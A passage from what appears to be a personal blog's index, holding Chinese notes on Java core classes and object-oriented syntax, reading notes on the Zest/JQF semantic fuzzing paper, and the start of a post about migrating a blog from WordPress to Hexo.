按系统默认编码转换，不推荐 byte[] b2 = \u0026quot;Hello\u0026quot;.getBytes(\u0026quot;UTF-8\u0026quot;); // 按UTF-8编码转换 byte[] b2 = \u0026quot;Hello\u0026quot;.getBytes(\u0026quot;GBK\u0026quot;); // 按GBK编码转换 byte[] b3 = \u0026quot;Hello\u0026quot;.getBytes(StandardCharsets.UTF_8); // 按UTF-8编码转换  转换编码后，就不再是char类型，而是byte类型表示的数组\n// 从 byte 数组转换回 String String s1 = new String(b, \u0026quot;GBK\u0026quot;); // 按GBK转换 String s2 = new String(b, StandardCharsets.UTF_8); // 按UTF-8转换  去除首位空白字符    去除首位空白字符方法 方法描述     String trim()  返回字符串的副本，忽略前导和尾部的空白   String strip() 同上，但是去除类似中文空格字符\\u3000   String stripLeading() 同上，只忽略前导空白   String stripTrailing() 同上，只忽略尾部空白    判断是否为空 注意区别blank与empty的区别，前者为只包含空白字符，后者为长度为零\n\u0026quot;\u0026quot;.isEmpty(); // true，因为字符串长度为0 \u0026quot; \u0026quot;.isEmpty(); // false，因为字符串长度不为0 \u0026quot; \\n\u0026quot;.isBlank(); // true，因为只包含空白字符 \u0026quot; Hello \u0026quot;.isBlank(); // false，因为包含非空白字符  正则表达式相关    正则表达式相关方法 方法解释     boolean matches(String regex)  告知此字符串是否匹配给定的正则表达式。   String replaceAll(String regex, String replacement) 用给定的串替换所有匹配给定的正则表达式的子字符串   String replaceFirst(String regex, String replacement)  用给定的串替换首个匹配给定的正则表达式的子字符串   String[] split(String regex)  根据给定正则表达式的匹配拆分此字符串    一般的普通替换可以使用\nString replace(char oldChar, char newChar) // 返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。  子串索引    子串索引方法 方法解释     int indexOf(int ch)  返回指定字符在此字符串中第一次出现处的索引。   int indexOf(int ch, int fromIndex)  同上，从指定的索引开始搜索。   int indexOf(String str)  返回指定子字符串在此字符串中第一次出现处的索引。   int indexOf(String str, int fromIndex)  同上，从指定的索引开始。       int lastIndexOf(int ch)  返回指定字符在此字符串中最后一次出现处的索引。   int lastIndexOf(int ch, int fromIndex)  同上，从指定的索引处开始进行反向搜索。   int lastIndexOf(String str)  返回指定子字符串在此字符串中最右边出现处的索引。   int lastIndexOf(String str, int fromIndex)  同上，从指定的索引开始反向搜索。       boolean startsWith(String prefix)  测试此字符串是否以指定的前缀开始   boolean endsWith(String suffix)  测试此字符串是否以指定的后缀结束    其他常用无参数方法    常用无参数方法 方法解释     String toLowerCase()  使用默认语言环境的规则将此 String 中的所有字符都转换为小写   String toUpperCase()  使用默认语言环境的规则将此 String 中的所有字符都转换为大写。   int hashCode()  返回此字符串的哈希码   int length() 返回此字符串的长度    其他内容 早期JDK版本中，String 总是以 char[] 存储的，而较新版本JDK下的 String 是以 byte[] 存储的。如果String仅包含ASCII字符，则每个byte存储一个字符，否则，每两个byte存储一个字符，这样做的目的是为了节省内存，因为大量的长度较短的String通常仅包含ASCII字符\n对于使用者来说，String内部的优化不影响任何已有代码，因为它的public方法签名是不变的。\n包装类型 Java有内置的，将基本类型包装为引用类型的类\n   基本类型 对应的引用类型     boolean java.lang.Boolean   byte java.lang.Byte   short java.lang.Short   int java.lang.Integer   long java.lang.Long   float java.lang.Float   double` java.lang.Double   char java.lang.Character    创建包装类型 int i = 100; // 通过new操作符创建Integer实例(不推荐使用,会有编译警告): Integer n1 = new Integer(i); // 通过静态方法valueOf(int)创建Integer实例: Integer n2 = Integer.valueOf(i); // 通过静态方法valueOf(String)创建Integer实例: Integer n3 = Integer.valueOf(\u0026quot;100\u0026quot;);  使用valueOf方法的时候，是把创建实例的工作留给Integer类内部去做，这些东西有可能会进行了优化，比直接使用new更优。我们把能创建“新”对象的静态方法称为静态工厂方法。Integer.valueOf()就是静态工厂方法，它尽可能地返回缓存的实例以节省内存；而直接使用new不是方法，更不是静态工厂方法。\nAuto Boxing Integer n = 100; // 编译器自动使用Integer.valueOf(int) int x = n; // 编译器自动使用Integer.intValue()  这样直接完成的，从基本类型到引用类型的转换叫做自动装箱(Auto Boxing)，反向地，从引用类型到基本类型叫做自动拆箱(Auto Unboxing)。这两个过程只发生在编译阶段（这句话没怎么看懂），目的是为了少些代码。但是装箱与拆箱会影响代码执行效率，因为在编译之后，这两个东西是完全区分开的，而且，由于引用类型可以有null值，所以在自动拆箱的时候还有可能产生NullPointerException。\n不变类 所有的包装类型都是不变类，也就是源码中设置的private final int value，一旦创建，无法改变。\n在比较包装类型的内容的时候，必须要使用equals()方法。此时使用==有些可以达成目的，原理同String类比较。\n数的类型转换 所有的整数和浮点数的包装类型都继承自Number，因此，可以非常方便地直接通过包装类型获取各种基本类型\n// 向上转型为Number: Number num = new Integer(999); // 获取byte, int, long, float, double: byte b = num.byteValue(); int n = num.intValue(); long ln = num.longValue(); float f = num.floatValue(); double d = num.doubleValue();  Integer类 进制转换 Integer.toString(100) // \u0026quot;100\u0026quot;,表示为10进制 Integer.toString(100, 36) // \u0026quot;2s\u0026quot;,表示为36进制 (Integer.toHexString(100) // \u0026quot;64\u0026quot;,表示为16进制 Integer.toOctalString(100) // \u0026quot;144\u0026quot;,表示为8进制 Integer.toBinaryString(100) // \u0026quot;1100100\u0026quot;,表示为2进制  上述方法输出的都是String。\n字符串解析整数 int x1 = Integer.parseInt(\u0026quot;100\u0026quot;); // 100 int x2 = Integer.parseInt(\u0026quot;100\u0026quot;, 16); // 256,因为按16进制解析  常用静态变量 // int可表示的最大/最小值: int max = Integer.MAX_VALUE; // 2147483647 int min = Integer.MIN_VALUE; // -2147483648 // long类型占用的bit和byte数量: int sizeOfLong = Integer.SIZE; // 64 (bits) int bytesOfLong = Integer.BYTES; // 8 (bytes)  Boolean类 // boolean只有两个值true/false，其包装类型只需要引用Boolean提供的静态字段: Boolean t = Boolean.TRUE; Boolean f = Boolean.FALSE;  无符号整型 Java中没有提供无符号整型(Unsigned)的基本数据类型。但是通过包装类型中给出的方法进行转化，以 Byte 为例。\nbyte x = -1; byte y = 127; Byte.toUnsignedInt(x) // 255 Byte.toUnsignedInt(y) // 127  注意 -1 转换之后变成了255，原因是以补码保存整数。\nJavaBean 如果读写方法符合以下这种命名规范：\n// 读方法: public Type getXyz() // 写方法: public void setXyz(Type value)  那么这种class被称为JavaBean。\nboolean字段比较特殊，它的读方法一般命名为isXyz()\n我们通常把一组对应的读方法（getter）和写方法（setter）称为属性（property）。例如，name属性：\n 对应的读方法是String getName()只有getter的属性称为只读属性（read-only） 对应的写方法是setName(String)  属性只需要定义getter和setter方法，不一定需要对应的字段，也可以是通过已有字段计算得到。\n可以看出，getter和setter也是一种数据封装的方法。\n作用 主要用来传递数据，即把一组数据组合成一个JavaBean便于传输。此外，JavaBean可以方便地被IDE工具分析，生成读写属性的代码，主要用在图形界面的可视化设计中。\n其他 通过IDE，可以快速生成getter和setter。\n// 要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的Introspector import java.beans.*; public class Main { public static void main(String[] args) throws Exception { BeanInfo info = Introspector.getBeanInfo(Person.class); for (PropertyDescriptor pd : info.getPropertyDescriptors()) { System.out.println(pd.getName()); System.out.println(\u0026quot; \u0026quot; + pd.getReadMethod()); System.out.println(\u0026quot; \u0026quot; + pd.getWriteMethod()); } } } class Person { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } }  枚举类 枚举类型的定义与C语言中相似，可以使用enum来的定义。但是在其他方面有一些不同。\n比较的时候要使用equals()方法，原因同前。但是也可以使用==， 因为enum类型的每个常量在JVM中只有一个唯一实例，所以可以直接使用==比较。编译后的enum类与普通的class类没有区别，每个常量是全局唯一，即static final修饰。比较之下有以下特点：\n 定义的enum类型总是继承自java.lang.Enum，且无法被继承 只能定义出enum的实例，而无法通过new操作符创建enum的实例 定义的每个实例都是引用类型的唯一实例 可以将enum类型用于switch语句  常用方法 在已定义如下的枚举类的背景下：\nenum Weekday { SUN, MON, TUE, WED, THU, FRI, SAT; }     常用方法 方法解释     name() 返回常量名，该方法不可覆写   ordinal() 返回定义的常量的顺序，从0开始计数   toString() 返回和name一样的字符串，但是这个方法可以覆写    注意常量的 ordinal 与常量的定义顺序密切相关，容易出错，可以定义private的构造方法，在内部使用。\nenum Weekday { MON(1, \u0026quot;星期一\u0026quot;), TUE(2, \u0026quot;星期二\u0026quot;), WED(3, \u0026quot;星期三\u0026quot;), THU(4, \u0026quot;星期四\u0026quot;), FRI(5, \u0026quot;星期五\u0026quot;), SAT(6, \u0026quot;星期六\u0026quot;), SUN(0, \u0026quot;星期日\u0026quot;); public final int dayValue; private final String chinese; private Weekday(int dayValue, String chinese) { this.dayValue = dayValue; this.chinese = chinese; } @Override public String toString() { return this.chinese; } }  覆写toString()的目的是在输出时更有可读性\n使用场景 与switch语句搭配使用，同C语言。记得加上default语句，可以在漏写某个枚举常量的时候自动报错，及时发现错误。\n记录类 Java14的新特性，一行写出不变类的定义。这里写一点例子吧，要是以后需要再去细看。\npublic record Point(int x, int y) {}  上文相当于写出了\npublic final class Point extends Record { private final int x; private final int y; public Point(int x, int y) { this.x = x; this.y = y; } public int x() { return this.x; } public int y() { return this.y; } public String toString() { return String.format(\u0026quot;Point[x=%s, y=%s]\u0026quot;, x, y); } public boolean equals(Object o) { ... } public int hashCode() { ... } }  可以加上检查逻辑，检查构造方法传入的参数是否正确。\npublic record Point(int x, int y) { public Point { if (x \u0026lt; 0 || y \u0026lt; 0) { throw new IllegalArgumentException(); } } }  此外，在record方法中，还可以新定义静态方法。\nBigInteger Java牛逼，内置高精度！废话不说了，直接上例子吧\nimport java.math.BigInteger; BigInteger bi = new BigInteger(\u0026quot;1234567890\u0026quot;); System.out.println(bi.pow(5)); // 2867971860299718107233761438093672048294900000  对大整数类做运算，只能使用实例方法了，支持链式操作，支持加减乘除平方。\n将大整数类型转换为基本类型的时候，尽量使用exact的方法，比如intValueExact()，如果内容已经超过了基本类型的范围，整数会返回ArithmeticException，而浮点数会返回Infinity之类的东西。下面列举的这些，可以强行转换，但是会舍弃超出的高位，有时会有严重问题，谨慎。\n 转换为byte：byteValue() 转换为short：shortValue() 转换为int：intValue() 转换为long：longValue() 转换为float：floatValue() 转换为double：doubleValue()  BigDecimal 高精度浮点数！不，不是，是任意大小，精度完全准确的浮点数！\nimport java.math.BigDecimal; import java.math.RoundingMode; BigDecimal d1 = new BigDecimal(\u0026quot;123.4500\u0026quot;); BigDecimal d2 = d1.stripTrailingZeros(); System.out.println(d1.scale()); // 4 System.out.println(d2.scale()); // 2,因为去掉了00 BigDecimal d3 = new BigDecimal(\u0026quot;1234500\u0026quot;); BigDecimal d4 = d3.stripTrailingZeros(); System.out.println(d3.scale()); // 0 System.out.println(d4.scale()); // -2，表示是个整数，后面有两个0 BigDecimal d1 = new BigDecimal(\u0026quot;123.456789\u0026quot;); BigDecimal d2 = d1.setScale(4, RoundingMode.HALF_UP); // 四舍五入，123.4568 BigDecimal d3 = d1.setScale(4, RoundingMode.DOWN); // 直接截断，123.4567 BigDecimal d1 = new BigDecimal(\u0026quot;123.456\u0026quot;); BigDecimal d2 = new BigDecimal(\u0026quot;23.456789\u0026quot;); BigDecimal d3 = d1.divide(d2, 10, RoundingMode.HALF_UP); // 保留10位小数并四舍五入 BigDecimal d4 = d1.divide(d2); // 报错：ArithmeticException，因为除不尽 BigDecimal n = new BigDecimal(\u0026quot;12.345\u0026quot;); BigDecimal m = new BigDecimal(\u0026quot;0.12\u0026quot;); BigDecimal[] dr = n.divideAndRemainder(m); System.out.println(dr[0]); // 102 System.out.println(dr[1]); // 0.105 // 返回的数组包含两个BigDecimal，分别是商和余数，其中商总是整数，余数不会大于除数。我们可以利用这个方法判断两个BigDecimal是否是整数倍数  在比较两个BigDecimal的值是否相等时，要特别注意，使用equals()方法不但要求两个BigDecimal的值相等，还要求它们的scale()相等。必须使用compareTo()方法来比较，它根据两个值的大小分别返回负数、正数和0，分别表示小于、大于和等于。\n常用工具类 Math 静态方法 Math.abs(-100); // 100 Math.abs(-7.8); // 7.8 Math.max(100, 99); // 100 Math.min(1.2, 2.3); // 1.2 Math.pow(2, 10); // 2的10次方=1024 Math.sqrt(2); // 1.414... Math.exp(2); // 7.389... Math.log(4); // 1.386... Math.log10(100); // 2 Math.sin(3.14); // 0.00159... Math.cos(3.14); // -0.9999... Math.tan(3.14); // -0.0015... Math.asin(1.0); // 1.57079... Math.acos(1.0); // 0.0  数学常量 double pi = Math.PI; // 3.14159... double e = Math.E; // 2.7182818... Math.random(); // 0.53907... 每次都不一样 范围是[0,1)  StrictMath Java标准库还提供了一个StrictMath，它提供了和Math几乎一模一样的方法。这两个类的区别在于，由于浮点数计算存在误差，不同的平台（例如x86和ARM）计算的结果可能不一致（指误差不同），因此，StrictMath保证所有平台计算结果都是完全相同的，而Math会尽量针对平台优化计算速度，所以，绝大多数情况下，使用Math就足够了。\nRandom import java.util.Random; Random r = new Random(); // 如果不给定种子，就使用系统当前时间戳作为种子，因此每次运行时，种子不同，得到的伪随机数序列就不同。 r.nextInt(); // 2071575453,每次都不一样 r.nextInt(10); // 5,生成一个[0,10)之间的int r.nextLong(); // 8811649292570369305,每次都不一样 r.nextFloat(); // 0.54335...生成一个[0,1)之间的float r.nextDouble(); // 0.3716...生成一个[0,1)之间的double  Math 中使用的随机数random就是调用的这个库\nSecureRandom 上面随机数的加强版，使用RNG（random number generator）算法。\nJDK的SecureRandom实际上有多种不同的底层实现，有的使用安全随机种子加上伪随机数算法来产生安全的随机数，有的使用真正的随机数生成器。实际使用的时候，可以优先获取高强度的安全随机数生成器，如果没有提供，再使用普通等级的安全随机数生成器。\nSecureRandom的安全性是通过操作系统提供的安全的随机种子来生成随机数。这个种子是通过CPU的热噪声、读写磁盘的字节、网络流量等各种随机事件产生的“熵”。在密码学中，安全的随机数非常重要。如果使用不安全的伪随机数，所有加密体系都将被攻破。因此，时刻牢记必须使用SecureRandom来产生安全的随机数。\nimport java.util.Arrays; import java.security.SecureRandom; import java.security.NoSuchAlgorithmException; public class Main { public static void main(String[] args) { SecureRandom sr = null; try { sr = SecureRandom.getInstanceStrong(); // 获取高强度安全随机数生成器 } catch (NoSuchAlgorithmException e) { sr = new SecureRandom(); // 获取普通的安全随机数生成器 } byte[] buffer = new byte[16]; sr.nextBytes(buffer); // 用安全随机数填充buffer System.out.println(Arrays.toString(buffer)); } } ","id":16,"section":"posts","summary":"\u003cp\u003e上一篇记录了Java的面向对象的语法，这篇来一点常用的核心类。\u003c/p\u003e","tags":["Java"],"title":"Java学习笔记——核心类","uri":"https://qeryu.github.io/2020/03/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%A0%B8%E5%BF%83%E7%B1%BB/","year":"2020"},{"content":"Java也不是学得第一个语言了，这里就只记录一些学习过程中发现的之前的没有见过的事情吧\n和C、C++、golang对照着学习。\n语句 循环 for each public class Main { public static void main(String[] args) { int[] ns = { 1, 4, 9, 16, 25 }; for (int n : ns) { System.out.println(n); } } }   更简单地遍历数组 但是无法指定遍历顺序 也无法获取数组的索引 能够遍历所有“可迭代”的数据类型，包括List、Map等  方法(method) 构造方法 class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public Person(String name) { this(name, 18); // 调用另一个构造方法Person(String, int) } public Person() { this(\u0026quot;Unnamed\u0026quot;); // 调用另一个构造方法Person(String) } }  一个构造方法可以调用其他构造方法，这样做的目的是便于代码复用。\n创建实例时初始化顺序为，先初始化字段，再执行构造方法。\n默认构造方法由编译器生成，没有参数，没有执行语句，如果已有自定义，需要重新定义一次默认构造方法。\n重载方法 String类提供了多个重载方法indexOf()，可以查找子串：\n int indexOf(int ch)：根据字符的Unicode码查找； int indexOf(String str)：根据字符串查找； int indexOf(int ch, int fromIndex)：根据字符查找，但指定起始位置； int indexOf(String str, int fromIndex)根据字符串查找，但指定起始位置。  方法名相同，但各自的参数不同，称为方法重载（Overload）。\n注意：方法重载的返回值类型通常都是相同的。\nArrays类 import java.util.Arrays; // ns为数组名 // 将一维数组转为字符串 Arrays.toString(ns) // 将多维数组转为字符串 Arrays.deepToString(ns) // 数组内容升序排列 Arrays.toString(ns)  继承 protect关键字 class Person { protected String name; protected int age; } class Student extends Person { public String hello() { return \u0026quot;Hello, \u0026quot; + name; // OK! } }  子类无法访问父类的private字段或者private方法\nprotected关键字可以把字段和方法的访问权限控制在继承树内部，一个protected字段和方法可以被其子类，以及子类的子类所访问\nsuper关键字 public class Main { public static void main(String[] args) { Student s = new Student(\u0026quot;Xiao Ming\u0026quot;, 12, 89); } } class Person { protected String name; protected int age; public Person(String name, int age) { this.name = name; this.age = age; } } class Student extends Person { protected int score; public Student(String name, int age, int score) { super(name, age); // 调用父类的构造方法Person(String, int) this.score = score; } }  在Java中，任何class的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句super();\n如果父类没有默认的构造方法，子类就必须显式调用super()并给出参数以便让编译器定位到父类的一个合适的构造方法。\n子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。\n转型 Java允许向上转型，抛弃一部分内容，把一个子类型安全地变为更加抽象的父类型。\n但是向下转型可能会失败，不能把父类变为子类，因为子类功能比父类多，多的功能无法凭空变出来，但是可以把实际是子类的父类向下转型为“子类”\n向下转型前要通过instanceof运算符进行判断，instanceof实际上判断一个变量所指向的实例是否是指定类型，或者这个类型的子类。如果一个引用变量为null，那么对任何instanceof的判断都为false。\nPerson p = new Student(); if (p instanceof Student) { // 只有判断成功才会向下转型: Student s = (Student) p; // 一定会成功 }  区分组合与继承 子类和父类的关系是is，has关系不能用继承。\n多态 覆写Override 在继承关系中，子类如果定义了一个与父类方法签名完全相同的方法，被称为覆写（Override）。\nOverride和Overload不同的是，如果方法签名如果不同，就是Overload，Overload方法是一个新方法；如果方法签名相同，并且返回值也相同，就是Override。方法名相同，方法参数相同，但方法返回值不同，也是不同的方法。在Java程序中，出现这种情况，编译器会报错。\n加上@Override可以让编译器帮助检查是否进行了正确的覆写。希望进行覆写，但是不小心写错了方法签名，编译器会报错。\npublic class Main { public static void main(String[] args) { } } class Person { public void run() {} } public class Student extends Person { @Override // Compile error! public void run(String s) {} }  多态Polymorphic 运行期才能动态决定调用的子类方法。对某个类型调用某个方法，执行的实际方法可能是某个子类的覆写方法。\n// 多态例子 public class Main { public static void main(String[] args) { // 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税: Income[] incomes = new Income[] { new Income(3000), new Salary(7500), new StateCouncilSpecialAllowance(15000) }; System.out.println(totalTax(incomes)); } public static double totalTax(Income... incomes) { double total = 0; for (Income income: incomes) { total = total + income.getTax(); } return total; } } class Income { protected double income; public Income(double income) { this.income = income; } public double getTax() { return income * 0.1; // 税率10% } } class Salary extends Income { public Salary(double income) { super(income); } @Override public double getTax() { if (income \u0026lt;= 5000) { return 0; } return (income - 5000) * 0.2; } } class StateCouncilSpecialAllowance extends Income { public StateCouncilSpecialAllowance(double income) { super(income); } @Override public double getTax() { return 0; } }  调用super // 在子类的覆写方法中，如果要调用父类的被覆写的方法，可以通过super来调用。 class Person { protected String name; public String hello() { return \u0026quot;Hello, \u0026quot; + name; } } Student extends Person { @Override public String hello() { // 调用父类的hello()方法: return super.hello() + \u0026quot;!\u0026quot;; } }  抽象类 abstract关键字 把一个方法声明为abstract，表示它是一个抽象方法，本身没有实现任何方法语句。由于这个抽象方法本身是无法执行的，所以，抽象方法所在的类也无法被实例化。必须把类本身也声明为abstract，才能正确编译它\npublic class Main { public static void main(String[] args) { Person p = new Student(); p.run(); } } abstract class Person { public abstract void run(); } class Student extends Person { @Override public void run() { System.out.println(\u0026quot;Student.run\u0026quot;); } }  由抽象类的概念，引申出面向抽象编程的概念，上层代码（抽象类）只定义规范（如run方法必须覆写），具体的业务逻辑由下层代码（具体的类）实现，调用者不必关心。\n接口 接口相比于抽象类没有字段，所有方法全部都是抽象方法。接口是比抽象类还要抽象的纯抽象接口。接口定义的所有方法默认都是public abstract的，所以这两个修饰符不需要写出来（写不写效果都一样）。\nimplement关键字 // 具体的类通过implement关键字实现interface。 class Student implements Person { private String name; public Student(String name) { this.name = name; } @Override public void run() { System.out.println(this.name + \u0026quot; run\u0026quot;); } @Override public String getName() { return this.name; } }  接口继承与default方法 interface继承自interface使用extends，它相当于扩展了接口的方法。接口可以继承自多个接口，这与类的继承不同。\ninterface Person { String getName(); // 实现类可以不必覆写default方法 default void run() { System.out.println(getName() + \u0026quot; run\u0026quot;); } } class Student implements Person { private String name; public Student(String name) { this.name = name; } public String getName() { return this.name; } }  default方法和抽象类的普通方法是有所不同的。因为interface没有字段，default方法无法访问字段，而抽象类的普通方法可以访问实例字段。\n接口与抽象类比较    abstract class interface      继承 只能extends一个class 可以implements多个interface   字段 可以定义实例字段 不能定义实例字段   抽象方法 可以定义抽象方法 可以定义抽象方法   非抽象方法 可以定义非抽象方法 可以定义default方法    静态字段与静态方法 实例字段 通常从类中定义的字段称为实例字段。每个实例都有独立的字段，各个实例的同名字段互不影响\n静态字段 每个实例中的静态字段共享一个空间。静态字段不属于实例，是另存与实例之外的字段。一般不使用实例访问静态字段，而是通过类名访问静态字段\n静态方法 调用静态方法不需要实例变量，通过类名就可以调用。类似于其他编程语言的函数。在静态方法内部无法访问this变量，也无法访问其他实例字段，只能访问静态字段。常用于辅助方法，例如Java程序入口的main()\npublic class Main { public static void main(String[] args) { Person.setNumber(99); System.out.println(Person.number); } } class Person { public static int number; public static void setNumber(int value) { number = value; } }  接口静态字段 接口可以有静态字段，但是静态字段必须为final类型。因为接口的字段只能是public static final类型，所以简写也可以。编译器会把通过实例调用的静态方法、静态字段，改写为通过类名调用的。编译器也会把接口中省略的静态子段修饰符自己补上。\npublic interface Person { // 编译器会自动加上public statc final: int MALE = 1; int FEMALE = 2; }  包 包名 包是Java中的命名空间，解决名字冲突。需要在定义class的时候第一行申明这个class属于哪个包。没有定义包名的class使用的是默认包，容易引起名字冲突。JVM执行的时候只区分完整类名：包名.类名.\n包名也可以是多层结构，用“ . ”分隔开，推荐使用倒置的域名作为包名。\n在电脑中存储的时候，Java文件对应的目录层次要和包的层次保持一致。编译后的class文件也是如此。IDE会帮助完成这项工作。\n同一个包中的类，可以相互访问包作用域下的字段和方法，即不用public / protected / private修饰的字段和方法\nimport关键字 导入可以是完整包名，也可以通过 * 一次导入该包下所有类（不建议）\n还可以通过import static导入包中类中的静态字段与静态方法（少用）\n编译器查找包逻辑  如果是完整类名，就直接根据完整类名查找这个class 如果是简单类名，按下面的顺序依次查找  查找当前package是否存在这个class 查找import的包是否包含这个class 查找java.lang包是否包含这个class   如果无法确定，编译报错  默认自动import当前package的其他class；默认自动import java.lang.*。自动导入的是java.lang包，但类似java.lang.reflect这些子包仍需要手动导入。如果有两个class名称相同，例如，mr.jun.Arrays和java.util.Arrays，那么只能import其中一个，另一个必须写完整类名。\n作用域 public  定义为public的class、interface可以被其他任何类访问 定义为public的field、method可以被其他类访问，前提是首先有访问class的权限 如果不确定是否需要public，就不声明为public，即尽可能少地暴露对外的字段和方法 一个.java文件只能包含一个public类，但可以包含多个非public类  private  定义为private的field、method无法被其他类访问 private访问权限被限定在class的内部，而且与方法声明顺序无关  推荐把private方法放到后面，因为public方法定义了类对外提供的功能，阅读代码的时候，应该先关注public方法。\n// 如果一个类内部还定义了嵌套类（nested class），那么，嵌套类拥有访问private的权限 public class Main { public static void main(String[] args) { Inner i = new Inner(); i.hi(); } // private方法: private static void hello() { System.out.println(\u0026quot;private hello!\u0026quot;); } // 静态内部类: static class Inner { public void hi() { Main.hello(); } } }  protected  protected作用于继承关系。定义为protected的字段和方法可以被子类访问，以及子类的子类  package  包作用域是指一个类允许访问同一个package的没有public、private修饰的class，以及没有public、protected、private修饰的字段和方法 只要在同一个包，就可以访问package权限的class、field和method 注意，包名必须完全一致，包没有父子关系，com.apache和com.apache.abc是不同的包 把方法定义为package权限有助于测试，因为测试类和被测试类只要位于同一个package，测试代码就可以访问被测试类的package权限方法。  final  用final修饰class可以阻止被继承 用final修饰method可以阻止被子类覆写 用final修饰field可以阻止被重新赋值 用final修饰局部变量可以阻止被重新赋值  classpath与jar  JVM通过环境变量classpath决定搜索class的路径和顺序 不推荐设置系统环境变量classpath，始终建议通过-cp命令传入 jar包相当于目录，可以包含很多.class文件，方便下载和使用 MANIFEST.MF文件可以提供jar包的信息，如Main-Class，这样可以直接运行jar包。 JVM自带的标准库rt.jar不要写到classpath中，写了反而会干扰JVM的正常运行。  模块 为了解决jar包之间的依赖问题，Java9后引入了模块的概念。.jmod文件每一个都是一个模块，模块名就是文件名。例如：模块java.base对应的文件就是java.base.jmod。模块之间的依赖关系已经被写入到模块内的module-info.class文件了。所有的模块都直接或间接地依赖java.base模块，只有java.base模块不依赖任何模块，它可以被看作是“根模块”，好比所有的类都是从Object直接或间接继承而来。\n把一堆class封装为jar仅仅是一个打包的过程，而把一堆class封装为模块则不但需要打包，还需要写入依赖关系，并且还可以包含二进制代码（通常是JNI扩展）。此外，模块支持多版本，即在同一个模块中可以为不同的JVM提供不同的版本。\n其他具体内容参见廖雪峰教程——模块\n","id":17,"section":"posts","summary":"\u003cp\u003eJava也不是学得第一个语言了，这里就只记录一些学习过程中发现的之前的没有见过的事情吧\u003c/p\u003e\n\u003cp\u003e和\u003ccode\u003eC\u003c/code\u003e、\u003ccode\u003eC++\u003c/code\u003e、\u003ccode\u003egolang\u003c/code\u003e对照着学习。\u003c/p\u003e","tags":["Java"],"title":"Java学习笔记——面向对象","uri":"https://qeryu.github.io/2020/03/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","year":"2020"},{"content":"清源团队大创项目，Java模糊测试优化，任务初期阅读论文：SemanticFuzzingWithZest\n模糊测试 模糊测试首先需要大量的测试用例，即种子输入。\n通过对已有的种子进行变异，得到大量的测试种子，然后通过对这些种子进行过滤，让这些测试种子变成“精品”，减少测试次数，更快发现漏洞。\n\n筛选的标准有很多可以选择，本文选择的是以测试样例的覆盖率为标准，感觉听起来和离散数学中的最大相容类，或者是线性代数中的极大线性无关组有点相似诶。\n从网上能找到的比较流行的模糊测试工具是AFL，一个导向fuzzing工具，这个似乎之前是安装过的，不过不会用，当时就当是Linux系统练手用的，也没深究。下面稍稍记录一些普通知识，AFL以后有时间就另开一篇博客写吧。\nFuzzing一般分为两类，分别是：\n 盲模糊测试（blind fuzzing） 导向模糊测试（guided fuzzing）  **盲模糊测试（blind fuzzing）**倾向于生成大量数据，通过量来撞触发漏洞的概率。**导向模糊测试（guided fuzzing）**则是关注测试数据的质量，期望生成更加有效地测试数据去提升触发漏洞的概率。\n结构化模糊测试(structured fuzzing) 通常，二进制模糊测试工具（例如AFL和libFuzzer）都会把输入以二进制形式进行操作。\n但是如果被测试的程序需要高度结构化的输入（比如XML文档），那么在二进制水平上的种子变异通常会产生语法上的错误，这样不仅会影响效率，也会造成一些核心内容不容易被检测到。\n结构化模糊测试工具会根据被测试程序所在领域的特定知识，去组织生成合乎语法要求的特定输入。GitHub上**JQF的说明文档**给出了一些利用libFuzzer进行测试的C++和Rust程序的例子。\n基于发生器(generator-based)的模糊测试(QuickCheck) 目前有一些陈述式的结构化输入生成工具 context-free grammars or protocol buffers，JQF使用QuickCheck的命令式方法指定输入空间：任意生成器程序，其工作是生成单个随机输入。（这句话看不懂诶）。我们很容易去写一些生成器程序，但是我们很难去评估这个生成器中，生成的例子，在fuzzing中的具体效果。\n语义模糊测试(Zest) JQF支持Zest算法。Zest算法通过代码覆盖率、输入有效性这两个反馈来指导QuickCheck类型的生成器，让他们去生成结构化的数据去测试语义上更加深层的bug。JQF使用字节码工具(bytecode instrumentaiton)来获取代码覆盖率，使用JUnit的Assume提供的API去来获取输入的有效性，当所有的assume都被满足的时候，这份输入被认为是有效的。\nZest方法 Zest是一种算法，它在生成语义合法的过程中更加偏向于以覆盖率作为指导。最大化覆盖率是指，尽可能通过少量的数据去测试全部的程序分支，以期达到更加高效的成果。\nZest算法的目标是找出传统模糊测试工具找不到的，更深的语义bug。通常情况下，这些bug都是只强调错误处理逻辑（这一句没看懂\u0026hellip;）\nJQF框架 JQF是一个模块化的框架，支持一下可作为指南的模糊测试前端。其中包括使用Zest进行的语义模糊测试，也就是本篇论文所提到的那个工具。\n一些词汇    词汇 释义     parse 进行语法分析   syntactic 语法的   semantic 语义的   parametric 参数的   mutation 变异   bias 偏向于   leverage 影响力，杠杆作用   declarative 陈述式的   imperative 命令式的   ","id":18,"section":"posts","summary":"\u003cp\u003e清源团队大创项目，Java模糊测试优化，任务初期阅读论文：\u003ccode\u003eSemanticFuzzingWithZest\u003c/code\u003e\u003c/p\u003e","tags":["SemanticFuzzing","Zest"],"title":"SemanticFuzzingWithZest阅读笔记","uri":"https://qeryu.github.io/2020/03/semanticfuzzingwithzest%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"记录了从WordPress转移到hexo过程中遇到的问题以及查阅的资料\n原因 因为要开始进行大创项目，所以需要一个Linux环境去跑这些JQF工具以及其他奇奇怪怪的东西。权衡之下就把阿里云的服务器腾空用于实践了，原WordPress上的内容就转移到了GitHub的博客上，试了一试广受好评的hexo博客，现在感觉还不错，至少明白一些东西从哪里调整，而且还没有总是无法安装插件的烦恼。\n过程 原博客导出 原本是想通过WordPress内置的导出功能，导出xml文件，然后通过hexo的migrate插件进行方便的迁移的。但是在过程中出现了导入后格式变化太大的情况。考虑到原博客内容较少，于是开始手动重新排版，顺便对之前博客中不满意的地方进行了一定的修改。\n新博客建立 Hexo安装与新建 